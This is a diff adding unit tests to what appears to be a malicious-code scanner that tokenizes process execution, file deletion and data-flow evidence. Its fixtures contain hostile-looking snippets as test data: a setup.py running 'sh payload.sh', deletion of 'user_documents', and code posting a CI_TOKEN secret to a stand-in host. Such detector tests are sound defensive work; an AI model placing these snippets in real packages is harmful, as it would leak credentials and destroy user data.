@@ -490,6 +490,55 @@ def test_low_model_probability_cannot_erase_capability_floor():
     assert result.verdict == "review"
 
 
+def test_model_tokens_distinguish_install_process_target_classes():
+    compiler = _RecordingModel()
+    shell = _RecordingModel()
+    interpreter = _RecordingModel()
+    decide(
+        [PythonExtractor().analyze_source("os.system('gcc --version')\n", "setup.py")],
+        compiler,
+    )
+    decide(
+        [PythonExtractor().analyze_source("os.system('sh payload.sh')\n", "setup.py")],
+        shell,
+    )
+    decide(
+        [
+            PythonExtractor().analyze_source(
+                "subprocess.run(['python', 'build.py'])\n", "setup.py"
+            )
+        ],
+        interpreter,
+    )
+    assert "P:install|C:sink|O:PROCESS_EXEC|T:process_compiler" in compiler.calls[0]
+    assert "P:install|C:sink|O:PROCESS_EXEC|T:process_shell" in shell.calls[0]
+    assert (
+        "P:install|C:sink|O:PROCESS_EXEC|T:process_interpreter" in interpreter.calls[0]
+    )
+    assert compiler.calls != shell.calls
+    assert shell.calls != interpreter.calls
+
+
+def test_model_tokens_distinguish_temporary_and_user_data_delete_targets():
+    temporary = _RecordingModel()
+    user_data = _RecordingModel()
+    decide(
+        [PythonExtractor().analyze_source("def f():\n    os.remove('cache.tmp')\n")],
+        temporary,
+    )
+    decide(
+        [
+            PythonExtractor().analyze_source(
+                "def f():\n    os.remove('user_documents')\n"
+            )
+        ],
+        user_data,
+    )
+    assert "P:runtime|C:sink|O:FILE_DELETE|T:delete_temporary" in temporary.calls[0]
+    assert "P:runtime|C:sink|O:FILE_DELETE|T:delete_user_data" in user_data.calls[0]
+    assert temporary.calls != user_data.calls
+
+
 def test_model_tokens_ignore_filename_and_concrete_network_target():
     first = _RecordingModel()
     second = _RecordingModel()
@@ -512,6 +561,42 @@ def test_model_tokens_ignore_filename_and_concrete_network_target():
     )
 
     assert first.calls == second.calls
+
+
+def test_model_input_preserves_path_evidence_strength():
+    unrelated = PythonExtractor().analyze_source(
+        """
+import os
+import requests
+
+def collect():
+    secret = os.getenv("CI_TOKEN")
+    harmless = "hello"
+    requests.post("https://example.invalid/telemetry", data=harmless)
+""",
+        "unrelated.py",
+    )
+    exact = PythonExtractor().analyze_source(
+        """
+import os
+import requests
+
+def collect():
+    secret = os.getenv("CI_TOKEN")
+    requests.post("https://example.invalid/collect", data=secret)
+""",
+        "exact.py",
+    )
+    unrelated_model = _RecordingModel()
+    exact_model = _RecordingModel()
+    decide([unrelated], unrelated_model)
+    decide([exact], exact_model)
+
+    assert unrelated_model.calls != exact_model.calls
+    assert "PATH:credential_or_file_exfil|K:proximity|Q:low" in unrelated_model.calls[0]
+    assert "PATH:credential_or_file_exfil|K:dataflow|Q:high" in exact_model.calls[0]
+    assert "EFFECT:FLOW:sensitive_data_to_network" not in unrelated_model.calls[0]
+    assert "EFFECT:FLOW:sensitive_data_to_network" in exact_model.calls[0]
 
 
 def test_training_canonicalization_matches_scan_model_sequence():
